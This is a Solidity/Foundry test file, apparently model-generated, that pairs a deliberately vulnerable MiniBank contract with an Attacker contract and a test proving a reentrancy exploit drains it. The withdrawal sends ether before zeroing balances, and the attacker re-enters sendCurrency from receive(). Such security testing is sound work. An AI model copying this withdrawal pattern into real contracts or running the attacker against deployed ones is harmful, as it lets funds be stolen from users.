// Generation Time: 29,94s
// Input Tokens: 3344
// Output Tokens: 834
// Reasoning Tokens: 2317


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";

contract MiniBank {
    mapping(address => uint256) private _balances;
    mapping(address => uint256) public membershipPoints;
    bool private _paused;

    modifier whenNotPaused() {
        require(!_paused, "Contract is paused");
        _;
    }

    function receiveCurrency() external payable whenNotPaused {
        require(msg.value > 0, "Cannot deposit 0");
        _balances[msg.sender] += msg.value;
        membershipPoints[msg.sender]++;
    }

    function sendCurrency() external whenNotPaused {
        uint256 amountToWithdraw = _balances[msg.sender];
        require(amountToWithdraw > 0, "Insufficient balance");
        
        _executeSendCurrency(msg.sender, amountToWithdraw);
    }

    function _executeSendCurrency(address beneficiary, uint256 amount) internal {
        (bool success, ) = payable(beneficiary).call{value: amount}("");
        require(success, "Transfer failed");

        _balances[beneficiary] = 0;
        membershipPoints[beneficiary] = 0;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// [Testing Goal] Prove that execution control can be hijacked to perform
// recursive calls, thereby breaking the intended atomicity of a sensitive method.
// ═══════════════════════════════════════════════════════════════════════════════

contract TestReentrancyMiniBank is Test {
    
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < 100 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public _victim;
    
    uint256 public reentrancyCount;
    bool public exploitSucceeded;

    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = MiniBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        
        storedAttackVal = val;
        _victim.receiveCurrency{value: val}();
    }

    function attack(uint256 val) public {
        _victim.sendCurrency();
        
        if (reentrancyCount > 1) { 
            exploitSucceeded = true; 
        }
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            _victim.sendCurrency();
        }
    }
}
